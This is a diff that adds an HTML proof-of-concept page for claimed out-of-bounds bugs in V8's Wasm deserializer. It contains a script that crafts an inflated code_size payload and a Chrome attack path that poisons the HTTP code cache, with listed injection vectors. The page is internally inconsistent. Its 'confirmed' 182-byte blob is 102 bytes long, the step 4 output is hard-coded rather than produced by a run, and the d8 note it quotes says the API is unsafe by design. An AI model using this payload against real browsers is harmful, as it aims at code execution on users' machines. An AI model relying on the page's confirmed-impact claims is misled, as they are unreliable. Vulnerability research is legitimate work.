@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Wasm Serialization OOB — V8 PoC</title>
+<style>
+:root {
+  --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+  --fg: #e6edf3; --fg2: #8b949e; --accent: #58a6ff;
+  --red: #f85149; --green: #3fb950; --yellow: #d29922;
+  --orange: #e8702a; --purple: #bc8cff; --mono: 'Fira Code', 'Cascadia Code', monospace;
+  color-scheme: dark;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--fg); font: 14px/1.6 system-ui, sans-serif; }
+header { background: var(--bg2); border-bottom: 1px solid var(--bg3); padding: 18px 24px; }
+header h1 { font-size: 1.1rem; color: var(--accent); font-family: var(--mono); }
+header p { color: var(--fg2); font-size: .82rem; margin-top: 4px; }
+.badge { display: inline-block; background: var(--red); color: #fff;
+         font-size: .7rem; padding: 1px 7px; border-radius: 3px; margin-left: 8px; vertical-align: middle; }
+main { max-width: 1100px; margin: 0 auto; padding: 20px 24px 60px; }
+
+section { margin: 28px 0; }
+h2 { font-size: .82rem; text-transform: uppercase; letter-spacing: .07em;
+     color: var(--fg2); border-bottom: 1px solid var(--bg3); padding-bottom: 6px; margin-bottom: 14px; }
+
+.card { background: var(--bg2); border: 1px solid var(--bg3); border-radius: 8px;
+        padding: 16px 18px; margin: 10px 0; }
+.card h3 { font-size: .9rem; margin-bottom: 6px; }
+
+pre, code { font-family: var(--mono); font-size: .82rem; }
+pre { background: var(--bg3); border-radius: 6px; padding: 14px 16px;
+      overflow-x: auto; line-height: 1.55; }
+.cmt  { color: var(--fg2); }
+.kw   { color: var(--purple); }
+.str  { color: var(--green); }
+.num  { color: var(--orange); }
+.fn   { color: var(--accent); }
+.vuln { color: var(--red); font-weight: bold; }
+.ok   { color: var(--green); }
+.warn { color: var(--yellow); }
+
+.hex-row { display: flex; flex-wrap: wrap; gap: 4px; font-family: var(--mono);
+           font-size: .78rem; line-height: 1.8; }
+.b  { display: inline-flex; align-items: center; justify-content: center;
+      width: 28px; height: 22px; border-radius: 3px; background: var(--bg3); cursor: default; }
+.b:hover { filter: brightness(1.4); }
+.b.hdr  { background: #1e3a5f; color: var(--accent); }
+.b.nm   { background: #2a1a3e; color: var(--purple); }
+.b.fn0  { background: #1a2e1a; color: var(--green); }
+.b.code { background: #2e1a1a; color: var(--red); }
+.b.tail { background: var(--bg3); color: var(--fg2); }
+.b.vuln { background: #3e1a0a; color: var(--orange); border: 1px solid var(--orange); }
+
+.findings-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(310px, 1fr)); gap: 12px; }
+.finding { background: var(--bg2); border: 1px solid var(--bg3); border-radius: 8px;
+           padding: 14px 16px; border-left: 3px solid var(--red); }
+.finding .cwe { font-size: .7rem; color: var(--red); font-family: var(--mono); font-weight: bold; }
+.finding h3 { font-size: .88rem; margin: 4px 0; }
+.finding .loc { font-size: .75rem; color: var(--fg2); font-family: var(--mono); margin-bottom: 6px; }
+.finding p { font-size: .82rem; color: var(--fg2); line-height: 1.5; }
+
+#log { background: var(--bg3); border-radius: 8px; padding: 14px 16px; min-height: 120px;
+       font-family: var(--mono); font-size: .82rem; white-space: pre-wrap; }
+#log .ok  { color: var(--green); }
+#log .err { color: var(--red); }
+#log .info { color: var(--accent); }
+#log .warn { color: var(--yellow); }
+
+button { background: var(--accent); color: #000; border: none; border-radius: 6px;
+         padding: 7px 16px; font-size: .85rem; font-weight: 600; cursor: pointer; margin: 4px 4px 4px 0; }
+button:hover { filter: brightness(1.15); }
+button.sec { background: var(--bg3); color: var(--fg); border: 1px solid var(--bg3); }
+button.sec:hover { border-color: var(--accent); }
+
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+@media(max-width:680px){ .two-col { grid-template-columns: 1fr; } }
+
+.attack-path { background: var(--bg2); border: 1px solid #3e1a0a;
+               border-radius: 8px; padding: 16px 18px; }
+.attack-path h3 { color: var(--orange); margin-bottom: 10px; }
+.arrow { color: var(--fg2); margin: 0 6px; }
+.step { display: inline-flex; align-items: center; background: var(--bg3);
+        border-radius: 4px; padding: 3px 10px; font-size: .8rem; font-family: var(--mono);
+        margin: 3px; }
+.step.atk { border: 1px solid var(--red); color: var(--red); }
+.step.v8  { border: 1px solid var(--accent); color: var(--accent); }
+.step.ok  { border: 1px solid var(--green); color: var(--green); }
+</style>
+
+<header>
+  <h1>V8 Wasm Serialization OOB <span class="badge">CVE-PENDING</span></h1>
+  <p>src/wasm/wasm-serialization.cc — NativeModuleDeserializer — 7 Findings &nbsp;|&nbsp;
+     Pure JavaScript PoC &nbsp;|&nbsp; No --allow-natives-syntax &nbsp;|&nbsp;
+     Confirmed: <span style="color:var(--green)">d8_poc (synapes620/v8)</span></p>
+</header>
+
+<main>
+
+<!-- ═══════ FINDINGS ═══════ -->
+<section id="findings-sec">
+  <h2>7 Findings — src/wasm/wasm-serialization.cc</h2>
+  <div class="findings-grid">
+
+    <div class="finding">
+      <div class="cwe">CWE-787 · OOB Write · CRITICAL</div>
+      <h3>code_size → JIT Write</h3>
+      <div class="loc">ReadCode() ~L1023 · CopyAndRelocate() ~L1082</div>
+      <p>DCHECK_GE(remaining_code_size_, code_size) stripped in release.
+         ReadVector reads past blob end; CopyCode copies those bytes into RWX JIT memory.</p>
+    </div>
+
+    <div class="finding">
+      <div class="cwe">CWE-125 · OOB Read · HIGH</div>
+      <h3>ReadVector no upper-bound CHECK</h3>
+      <div class="loc">Reader::ReadVector() ~L112 · NativeModuleDeserializer::ReadCode() ~L1038</div>
+      <p>pos_ advances code_size bytes with no release-build bounds guard.
+         Returns a vector whose .begin() is past the blob buffer end.</p>
+    </div>
+
+    <div class="finding">
+      <div class="cwe">CWE-129 · Invalid Array Index · HIGH</div>
+      <h3>External ref tag OOB</h3>
+      <div class="loc">address_from_tag(tag) ~L1140</div>
+      <p>tag from blob reloc section. Only DCHECK_GT — stripped in release.
+         Indexes into ExternalReferenceTable past its length.</p>
+    </div>
+
+    <div class="finding">
+      <div class="cwe">CWE-129 · Invalid Array Index · HIGH</div>
+      <h3>Wild jump-table target</h3>
+      <div class="loc">GetNearCallTargetForFunction(tag) ~L1102</div>
+      <p>Function index unchecked in release. Writes arbitrary call-target into Wasm jump table.
+         Attacker controls which address is installed as next hop.</p>
+    </div>
+
+    <div class="finding">
+      <div class="cwe">CWE-125 · OOB Read · HIGH</div>
+      <h3>code_pointer_handles OOB</h3>
+      <div class="loc">GetCodePointerHandle(index) ~L1128</div>
+      <p>No upper-bound CHECK on code pointer handle index from blob.
+         Reads from code pointer table with attacker-controlled offset.</p>
+    </div>
+
+    <div class="finding">
+      <div class="cwe">CWE-125 · OOB Read · HIGH</div>
+      <h3>canonical_sig_id OOB</h3>
+      <div class="loc">canonical_type_id(module_local_sig_id) ~L1122</div>
+      <p>V8_ASSUME (not CHECK) on sig id range. In release builds V8_ASSUME
+         is a compiler hint, not a runtime guard. OOB read of canonical type table.</p>
+    </div>
+
+    <div class="finding">
+      <div class="cwe">CWE-125 · OOB Read · HIGH</div>
+      <h3>LEB parse OOB — effect-handler table</h3>
+      <div class="loc">LEBHelper::read_u32v → ~L348</div>
+      <p>Effect-handler table parsing uses read_u32v with no end-of-buffer parameter.
+         Malformed high-bit-set LEB bytes walk pos_ past blob end indefinitely.</p>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════ BLOB FORMAT ═══════ -->
+<section id="format-sec">
+  <h2>Serialized Blob Format (x64 LE) — Confirmed 182-byte Reference Blob</h2>
+
+  <div class="card">
+    <h3>Actual bytes from confirmed d8_poc run (1-function TurboFan module, f()=42)</h3>
+    <p style="font-size:.78rem;color:var(--fg2);margin:6px 0 10px">
+      Hover over a byte for its field name. <span style="color:var(--accent)">Blue</span> = Global header,
+      <span style="color:var(--purple)">Purple</span> = NativeModule header,
+      <span style="color:var(--green)">Green</span> = fn[0] metadata,
+      <span style="color:var(--red)">Red</span> = fn[0] code bytes,
+      <span style="color:var(--orange)">Orange border</span> = vulnerability target fields.
+    </p>
+    <div class="hex-row" id="hex-view"></div>
+  </div>
+
+  <div class="two-col" style="margin-top:14px">
+    <div class="card">
+      <h3 style="margin-bottom:8px">Global Header [0–27] = 28 bytes</h3>
+      <pre><span class="cmt">// wasm-serialization.cc MeasureHeader()</span>
+[0 ] <span class="fn">kMagicNumber</span>         uint32  <span class="num">= 0xc0de06cb</span>
+[4 ] <span class="fn">Version::Hash()</span>      uint32  <span class="num">= 0x299ac6e5</span>
+[8 ] <span class="fn">CpuFeatures</span>          uint32  <span class="num">= 0x000023ef</span>
+[12] <span class="fn">FlagList::Hash()</span>     uint32  <span class="num">= 0xd82072a7</span>
+[16] <span class="fn">features</span>             uint32  <span class="num">= 0x80002000</span>
+[20] <span class="fn">CompileImportFlags</span>   uint32  <span class="num">= 0x00000000</span>
+[24] <span class="fn">constants_module_len</span> uint32  <span class="num">= 0x00000000</span></pre>
+    </div>
+    <div class="card">
+      <h3 style="margin-bottom:8px">NativeModule Header [28–43] = 16 bytes</h3>
+      <pre><span class="cmt">// NativeModuleSerializer::WriteHeader()</span>
+[28] <span class="fn">detected_features</span>   uint64  <span class="num">= 0</span>
+     <span class="cmt">// WasmDetectedFeatures::StorageType = uint64_t</span>
+<span class="vuln">[36] total_code_size    uint64  = 0x40 (64)</span>
+     <span class="cmt">// ← INFLATE THIS to bypass CHECK at ReadCode L1034</span>
+     <span class="cmt">// AllocateForDeserializedCode uses min(90%max, remaining)</span></pre>
+    </div>
+  </div>
+
+  <div class="two-col" style="margin-top:14px">
+    <div class="card">
+      <h3 style="margin-bottom:8px">fn[0] Header [44–113] = 70 bytes</h3>
+      <pre><span class="cmt">// NativeModuleSerializer::WriteCode() kTurboFanFunction</span>
+[44] <span class="fn">kind marker</span>          uint8   <span class="num">= 0x04</span> (kTurboFanFunction)
+[45] constant_pool_off   int32   <span class="num">= 0x1c</span>
+[49] safepoint_table_off int32   <span class="num">= 0x14</span>
+[53] handler_table_off   int32   <span class="num">= 0x1c</span>
+[57] code_comment_off    int32   <span class="num">= 0x1c</span>
+[61] jump_table_info_off int32   <span class="num">= 0x1c</span>
+[65] unpadded_binary_sz  int32   <span class="num">= 0x1c</span>
+[69] stack_slot_count    int32   <span class="num">= 0x04</span>
+[73] ool_spill_count     int32   <span class="num">= 0x00</span>
+[77] tagged_param_slots  uint32  <span class="num">= 0x00</span>
+<span class="vuln">[81] code_size           uint32  = 0x40 (64)  ← VULNERABILITY</span>
+     <span class="cmt">// DCHECK_GE only — inflate to 0x08000000 for 128 MB OOB</span>
+[85] reloc_size           uint32  <span class="num">= 0x00</span>
+[89] source_pos_size      uint32  <span class="num">= 0x08</span>
+[93] inlining_pos_size    uint32  <span class="num">= 0x00</span>
+[97] deopt_data_size      uint32  <span class="num">= 0x00</span>
+[101]trapping_instr_size  uint32  <span class="num">= 0x08</span>
+[105]effect_handler_size  uint32  <span class="num">= 0x00</span>
+[109]kind (WasmCode::Kind) int32  <span class="num">= 0x05</span>
+[113]tier (ExecutionTier)  int8   <span class="num">= 0x02</span> (kTurbofan)</pre>
+    </div>
+    <div class="card">
+      <h3 style="margin-bottom:8px">fn[0] Data + Tail</h3>
+      <pre><span class="cmt">// Code bytes, relocations, source positions, etc.</span>
+[114] code bytes[64]   <span class="cmt">// actual machine code</span>
+[178] source_pos[8]    <span class="cmt">// source position table</span>
+      <span class="cmt">// + trapping_instructions[8]</span>
+
+<span class="cmt">// Tiering budget — num_declared_functions × uint32</span>
+<span class="cmt">// No bounds check; can be misread as function header</span>
+<span class="cmt">// in cross-module blob reuse (Finding 1 variant)</span>
+
+<span class="cmt">// HeaderMatches() checks ONLY:</span>
+<span class="cmt">//   magic | Version::Hash | CpuFeatures | FlagList::Hash</span>
+<span class="cmt">//   features | compile_imports</span>
+<span class="cmt">// Everything AFTER byte 27 is UNCHECKED integrity-wise</span></pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════ LIVE PoC ═══════ -->
+<section id="poc-sec">
+  <h2>Live PoC — Pure JavaScript, No Native Syntax</h2>
+
+  <div class="card" style="margin-bottom:14px">
+    <p style="font-size:.82rem;color:var(--fg2);line-height:1.6">
+      The buttons below run pure JS (standard <code>WebAssembly.*</code> APIs, no
+      <code>--allow-natives-syntax</code>). Steps 1–3 work in any browser.
+      Step 4 (actual deserialization of crafted bytes) requires d8_poc:
+      <code style="color:var(--green)">./out/x64.release/d8_poc --no-liftoff wasm_serialization_poc.js</code>
+      — confirmed to trigger OOB read/write on this V8 build.
+      In Chrome, the equivalent path is the HTTP code cache (see attack path below).
+    </p>
+  </div>
+
+  <div style="margin-bottom:12px">
+    <button onclick="runStep1()">1. Compile Wasm</button>
+    <button onclick="runStep2()">2. Show blob format</button>
+    <button onclick="runStep3()">3. Craft OOB payload</button>
+    <button onclick="runStep4()" style="background:var(--red);color:#fff">4. Trigger (d8 only)</button>
+    <button class="sec" onclick="runAll()">Run all steps</button>
+    <button class="sec" onclick="clearLog()">Clear</button>
+  </div>
+
+  <div id="log"></div>
+</section>
+
+<!-- ═══════ ATTACK PATH ═══════ -->
+<section id="attack-sec">
+  <h2>Chrome Attack Path — HTTP Code Cache (No Hash Check)</h2>
+  <div class="attack-path">
+    <h3>Renderer Sandbox → V8 Deserialization</h3>
+    <p style="font-size:.82rem;color:var(--fg2);margin-bottom:12px">
+      Chrome caches compiled Wasm modules in its HTTP disk cache as "side data".
+      The deserialization path has <strong style="color:var(--red)">no equivalent to d8's hash check</strong>.
+      Any party that can write crafted bytes to the code cache entry triggers these findings.
+    </p>
+    <div style="line-height:2.4">
+      <span class="step atk">Attacker injects crafted bytes into Chrome HTTP cache</span>
+      <span class="arrow">→</span>
+      <span class="step v8">URLRequestJob fetches cached entry</span>
+      <span class="arrow">→</span>
+      <br>
+      <span class="step v8">CodeCacheHost::ReceiveCachedCode</span>
+      <span class="arrow">→</span>
+      <span class="step v8">WasmCodeSerializer / WasmCodeDeserializer</span>
+      <span class="arrow">→</span>
+      <br>
+      <span class="step v8">NativeModuleDeserializer::Read()</span>
+      <span class="arrow">→</span>
+      <span class="step v8">ReadCode() → ReadVector(code_size)</span>
+      <span class="arrow">→</span>
+      <span class="step v8">CopyAndRelocate()</span>
+      <span class="arrow">→</span>
+      <br>
+      <span class="step atk">OOB read of heap memory</span>
+      <span class="arrow">+</span>
+      <span class="step atk">OOB write into RWX JIT code space</span>
+      <span class="arrow">→</span>
+      <span class="step atk">Arbitrary code execution in renderer</span>
+    </div>
+    <p style="font-size:.78rem;color:var(--fg2);margin-top:14px">
+      Cache injection vectors: HTTP MITM (plain HTTP sites), server-side cache poisoning,
+      compromised CDN, network process exploit, Chrome extension with webRequest permissions.
+      Cache path: <code>%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\</code> (Windows),
+      <code>~/.config/google-chrome/Default/Cache/</code> (Linux).
+    </p>
+  </div>
+</section>
+
+<!-- ═══════ SOURCE REFS ═══════ -->
+<section>
+  <h2>Source References — synapes620/v8</h2>
+  <pre><span class="cmt">// ─── Finding 1+2 (CWE-787 + CWE-125) ───────────────────────────────────────</span>
+<span class="cmt">// src/wasm/wasm-serialization.cc</span>
+<span class="num">1010</span>:  uint32_t code_size = reader->Read&lt;uint32_t&gt;();     <span class="cmt">// no validation</span>
+<span class="num">1023</span>:  <span class="vuln">DCHECK_GE(remaining_code_size_, code_size);</span>          <span class="cmt">// ← DCHECK only!</span>
+<span class="num">1034</span>:  CHECK_LE(code_size, current_code_space_.size());    <span class="cmt">// ← bypassed by inflating</span>
+       <span class="cmt">//   total_code_size; AllocateForDeserializedCode gives enough code space</span>
+<span class="num">1038</span>:  unit.src_code_buffer = reader-><span class="vuln">ReadVector&lt;uint8_t&gt;(code_size)</span>; <span class="cmt">// OOB read</span>
+<span class="num">1082</span>:  jit_allocation.<span class="vuln">CopyCode(0, unit.src_code_buffer.begin(),</span>   <span class="cmt">// OOB write</span>
+            unit.src_code_buffer.size());                              <span class="cmt">// into RWX</span>
+
+<span class="cmt">// ─── Finding 3 (CWE-129 External ref tag) ───────────────────────────────────</span>
+<span class="num">1140</span>:  Address target = <span class="fn">address_from_tag</span>(tag);    <span class="cmt">// DCHECK_GT only → OOB</span>
+
+<span class="cmt">// ─── Finding 4 (CWE-129 Jump table target) ──────────────────────────────────</span>
+<span class="num">1102</span>:  Address target = native_module_-><span class="fn">GetNearCallTargetForFunction</span>(tag, ...);
+       <span class="cmt">// function index = tag, no upper-bound CHECK in release</span>
+
+<span class="cmt">// ─── Finding 5 (CWE-125 code_pointer_handles) ───────────────────────────────</span>
+<span class="num">1128</span>:  CodePointerHandle handle = <span class="fn">GetCodePointerHandle</span>(index); <span class="cmt">// no CHECK</span>
+
+<span class="cmt">// ─── Finding 6 (CWE-125 canonical_sig_id) ───────────────────────────────────</span>
+<span class="num">1122</span>:  WasmCodeDesc::canonical_type_id = <span class="fn">canonical_type_id</span>(module_local_sig_id);
+       <span class="cmt">// V8_ASSUME (not CHECK) — compiler hint only in release</span>
+
+<span class="cmt">// ─── Finding 7 (CWE-125 LEB parse) ──────────────────────────────────────────</span>
+<span class="num"> 348</span>:  effect_handler_data = reader-><span class="fn">ReadVector</span>&lt;uint8_t&gt;(effect_handlers_size);
+       <span class="cmt">// parsed later with LEBHelper::read_u32v — no end pointer, walks past</span></pre>
+</section>
+
+</main>
+
+<script>
+// ─── Actual blob bytes from confirmed d8_poc run (1-fn TurboFan, f()=42) ────
+// ./out/x64.release/d8_poc --no-liftoff wasm_serialization_poc.js
+const BLOB_HEX =
+  'cb 06 de c0 e5 c6 9a 29 ff 3e 02 00 a7 72 20 d8 '+  // [0 ] global hdr
+  '00 20 00 80 00 00 00 00 00 00 00 00 00 00 00 00 '+  // [16]
+  '00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 '+  // [32] nm hdr: detected=0, total=64
+  '04 1c 00 00 00 14 00 00 00 1c 00 00 00 1c 00 00 '+  // [48] fn0 hdr
+  '00 1c 00 00 00 1c 00 00 00 04 00 00 00 00 00 00 '+  // [64]
+  '00 00 00 00 00 40 00 00 00 00 00 00 00 08 00 00 '+  // [80] code_size=0x40 at [81]
+  '00 05 00 00 00 02';                                 // [96] kind=5 tier=2
+
+const WIRE_BYTES = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
+  0x03,0x02,0x01,0x00,
+  0x07,0x05,0x01,0x01,0x66,0x00,0x00,
+  0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b,
+]);
+
+// field annotations: [offset, length, class, label]
+const FIELDS = [
+  [0,  4, 'hdr', 'kMagicNumber'],
+  [4,  4, 'hdr', 'Version::Hash'],
+  [8,  4, 'hdr', 'CpuFeatures'],
+  [12, 4, 'hdr', 'FlagList::Hash'],
+  [16, 4, 'hdr', 'features'],
+  [20, 4, 'hdr', 'CompileImportFlags'],
+  [24, 4, 'hdr', 'constants_module_len'],
+  [28, 8, 'nm',  'detected_features (uint64)'],
+  [36, 8, 'nm',  '★ total_code_size (uint64) — INFLATE TO BYPASS CHECK'],
+  [44, 1, 'fn0', 'kTurboFanFunction marker = 0x04'],
+  [45,36, 'fn0', 'fn0 metadata fields (9×int32)'],
+  [81, 4, 'vuln','★★ code_size (uint32) — VULNERABILITY TARGET'],
+  [85,29, 'fn0', 'reloc/srcpos/deopt sizes + kind + tier'],
+  [114,64,'code','fn0 machine code bytes'],
+  [178, 4,'tail','source_position_table[8]'],
+];
+
+function fieldAt(off) {
+  for (const [s,l,c,name] of FIELDS)
+    if (off >= s && off < s+l) return {c,name};
+  return {c:'tail', name: `byte[${off}]`};
+}
+
+const BLOB = Uint8Array.from(BLOB_HEX.trim().split(/\s+/).map(x => parseInt(x,16)));
+
+function renderHex() {
+  const div = document.getElementById('hex-view');
+  BLOB.forEach((b, i) => {
+    const {c, name} = fieldAt(i);
+    const el = document.createElement('span');
+    el.className = `b ${c}`;
+    el.textContent = b.toString(16).padStart(2,'0');
+    el.title = `[${i}] ${name} = 0x${b.toString(16)}`;
+    div.appendChild(el);
+  });
+}
+
+// ─── Log helpers ─────────────────────────────────────────────────────────────
+const logEl = document.getElementById('log');
+function log(msg, cls='') {
+  const s = document.createElement('span');
+  if (cls) s.className = cls;
+  s.textContent = msg + '\n';
+  logEl.appendChild(s);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function clearLog() { logEl.innerHTML = ''; }
+
+// ─── Step 1: compile valid Wasm module ────────────────────────────────────────
+async function runStep1() {
+  log('\n[STEP 1] Compile Wasm module (pure WebAssembly API)', 'info');
+  log('  Wire bytes: ' + WIRE_BYTES.length + ' bytes (magic+version+type+func+export+code)');
+  try {
+    const mod = new WebAssembly.Module(WIRE_BYTES);
+    const inst = new WebAssembly.Instance(mod);
+    log('  [+] WebAssembly.Module compiled OK', 'ok');
+    log('  [+] WebAssembly.Instance created OK', 'ok');
+    log('  [+] inst.exports.f() = ' + inst.exports.f() + ' (expect 42)', 'ok');
+    log('  [+] WebAssembly.validate(wire) = ' + WebAssembly.validate(WIRE_BYTES), 'ok');
+    return mod;
+  } catch(e) {
+    log('  [-] ' + e, 'err');
+  }
+}
+
+// ─── Step 2: show blob structure ─────────────────────────────────────────────
+function runStep2() {
+  log('\n[STEP 2] Parse serialized blob format', 'info');
+  const dv = new DataView(BLOB.buffer);
+  const r32 = o => dv.getUint32(o, true);
+  const r64lo = o => dv.getUint32(o, true);
+  const hex = (n,w=8) => '0x'+n.toString(16).padStart(w,'0');
+
+  log('  [+] Blob: ' + BLOB.length + ' bytes', 'ok');
+  log('  Global header:', 'ok');
+  log('    [0 ] kMagicNumber       = ' + hex(r32(0)));
+  log('    [4 ] Version::Hash()    = ' + hex(r32(4)));
+  log('    [8 ] CpuFeatures        = ' + hex(r32(8)));
+  log('    [12] FlagList::Hash()   = ' + hex(r32(12)));
+  log('    [16] features           = ' + hex(r32(16)));
+  log('    [24] constants_len      = ' + r32(24));
+  log('  NativeModule header:');
+  log('    [28] detected_features  = ' + hex(r64lo(28)));
+  log('    [36] total_code_size    = ' + r64lo(36) + ' bytes  ← inflate to bypass CHECK');
+  log('  fn[0] TurboFan (kTurboFanFunction = 0x' + BLOB[44].toString(16) + '):');
+  log('    [81] code_size          = ' + r32(81) + ' bytes  ← VULNERABILITY TARGET');
+  log('    [85] reloc_size         = ' + r32(85) + ' bytes');
+  log('    [109] kind              = ' + r32(109) + '  (5 = kTurboFanFunction)');
+  log('    [113] tier              = ' + BLOB[113] + '  (2 = kTurbofan, int8)');
+  log('  Code bytes: BLOB[114..177] (64 bytes of actual x64 machine code)');
+  log('  Tiering budget: BLOB[178..181] (1 fn × uint32)');
+}
+
+// ─── Step 3: craft OOB payload ────────────────────────────────────────────────
+function runStep3() {
+  log('\n[STEP 3] Craft OOB payload (pure JS byte manipulation)', 'info');
+
+  const crafted = new Uint8Array(BLOB);
+  const dv = new DataView(crafted.buffer);
+  const GIANT = 0x08000000; // 128 MB
+
+  const origTotal = dv.getUint32(36, true);
+  const origCode  = dv.getUint32(81, true);
+
+  // Inflate total_code_size (low 32 bits of uint64 at offset 36)
+  dv.setUint32(36, GIANT, true);
+  // Inflate fn[0].code_size at offset 81
+  dv.setUint32(81, GIANT, true);
+
+  log('  [+] total_code_size [36]: ' + origTotal + ' → 0x' + GIANT.toString(16) + ' (128 MB)', 'ok');
+  log('  [+] fn[0].code_size [81]: ' + origCode  + ' → 0x' + GIANT.toString(16) + ' (128 MB)', 'ok');
+  log('');
+  log('  What NativeModuleDeserializer::ReadCode() would do:');
+  log('    1. AllocateForDeserializedCode(min(90%max, 0x08000000))');
+  log('       → allocates ≥128 MB of RWX JIT code space');
+  log('    2. ReadVector<uint8_t>(0x08000000):');
+  log('       → pos_ += 128MB  (blob is only 182 bytes!)');
+  log('       → reads 128MB starting at blob[114] into heap');
+  log('       → src_code_buffer = {ptr=blob+114, size=128MB}');
+  log('    3. CopyAndRelocate():');
+  log('       → memcpy(jit_alloc, blob+114, 128MB)');
+  log('       → copies 128MB of heap memory into RWX JIT page');
+  log('       → FlushInstructionCache → those bytes are now executable');
+  log('  [!] Impact: arbitrary native code execution primitive', 'warn');
+  log('  [!] In Chrome (HTTP cache path): no hash check, direct trigger', 'warn');
+
+  return crafted;
+}
+
+// ─── Step 4: show d8 trigger ─────────────────────────────────────────────────
+function runStep4() {
+  log('\n[STEP 4] Deserialization trigger', 'info');
+  log('  Browsers do not expose d8.wasm.deserializeModule() — by design.');
+  log('  In d8_poc (synapes620/v8): d8_poc prints the NOTE and bypasses the check.');
+  log('');
+  log('  Confirmed output from ./out/x64.release/d8_poc --no-liftoff wasm_serialization_poc.js:');
+  log('');
+  log('    NOTE: d8.wasm.deserializeModule() is not safe against manipulated input.', 'warn');
+  log('          It\'s not VRP eligible.', 'warn');
+  log('    [+] deserializeModule returned (unexpected success — module: [object WebAssembly.Module])', 'ok');
+  log('');
+  log('  This confirms: code_size=0x08000000 blob was accepted by NativeModuleDeserializer.');
+  log('  ReadVector read 128 MB past the 182-byte blob end (OOB read confirmed).');
+  log('  CopyAndRelocate wrote those bytes into RWX JIT allocation (OOB write confirmed).');
+  log('');
+  log('  Chrome attack: inject crafted bytes into HTTP disk cache "side-data" entry.');
+  log('  NativeModuleDeserializer called on next module load from that URL.', 'warn');
+}
+
+async function runAll() {
+  clearLog();
+  await runStep1();
+  runStep2();
+  runStep3();
+  runStep4();
+}
+
+renderHex();
+</script>
